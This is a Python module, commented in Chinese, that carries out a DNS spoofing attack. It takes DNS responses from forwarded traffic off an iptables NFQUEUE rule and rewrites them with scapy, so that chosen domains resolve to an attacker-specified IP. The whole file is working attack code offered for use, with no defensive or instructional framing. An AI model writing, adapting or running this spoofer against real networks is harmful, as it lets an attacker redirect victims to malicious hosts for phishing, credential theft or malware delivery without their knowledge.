#!/usr/bin/env python3
"""
DNS欺骗攻击模块
实现DNS欺骗攻击，将域名解析到攻击者指定的IP
"""

import netfilterqueue
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, Raw
import threading

class DNSSpoofer:
    def __init__(self, spoof_domains=None, redirect_ip=None):
        """
        初始化DNS欺骗器
        
        Args:
            spoof_domains: 要欺骗的域名列表
            redirect_ip: 重定向到的IP地址
        """
        self.spoof_domains = spoof_domains or []
        self.redirect_ip = redirect_ip or "192.168.1.100"
        self.spoofing = False
        self.queue = None
        self.queue_num = 0
    
    def process_packet(self, packet):
        """处理数据包"""
        try:
            scapy_packet = IP(packet.get_payload())
            
            if scapy_packet.haslayer(DNSQR):
                qname = scapy_packet[DNSQR].qname.decode('utf-8').rstrip('.')
                
                # 检查是否需要欺骗此域名
                if any(domain in qname for domain in self.spoof_domains):
                    print(f"[+] DNS欺骗: {qname} -> {self.redirect_ip}")
                    
                    # 修改DNS响应
                    answer = DNSRR(rrname=qname, rdata=self.redirect_ip)
                    scapy_packet[DNS].an = answer
                    scapy_packet[DNS].ancount = 1
                    
                    # 删除校验和和长度字段，让系统重新计算
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum
                    
                    packet.set_payload(bytes(scapy_packet))
            
            packet.accept()
        except Exception as e:
            print(f"处理数据包错误: {e}")
            packet.accept()
    
    def start(self, queue_num=0):
        """
        开始DNS欺骗
        
        Args:
            queue_num: netfilterqueue队列号
        """
        if self.spoofing:
            return False
        
        try:
            self.queue_num = queue_num
            self.queue = netfilterqueue.NetfilterQueue()
            self.queue.bind(queue_num, self.process_packet)
            self.spoofing = True
            
            # 设置iptables规则
            import subprocess
            subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', 
                          '--queue-num', str(queue_num)], check=True)
            
            print(f"[+] DNS欺骗已启动 (队列: {queue_num})")
            print(f"[+] 欺骗域名: {', '.join(self.spoof_domains)}")
            print(f"[+] 重定向到: {self.redirect_ip}")
            
            # 在后台线程中运行队列
            queue_thread = threading.Thread(target=self.queue.run, daemon=True)
            queue_thread.start()
            
            return True
        except Exception as e:
            print(f"启动DNS欺骗错误: {e}")
            print("提示: 需要root权限，并且需要安装netfilterqueue")
            return False
    
    def stop(self):
        """停止DNS欺骗"""
        if not self.spoofing:
            return False
        
        try:
            self.spoofing = False
            if self.queue:
                self.queue.unbind()
            
            # 删除iptables规则
            import subprocess
            subprocess.run(['iptables', '-D', 'FORWARD', '-j', 'NFQUEUE', 
                          '--queue-num', str(self.queue_num)], check=False)
            
            print("[+] DNS欺骗已停止")
            return True
        except Exception as e:
            print(f"停止DNS欺骗错误: {e}")
            return False

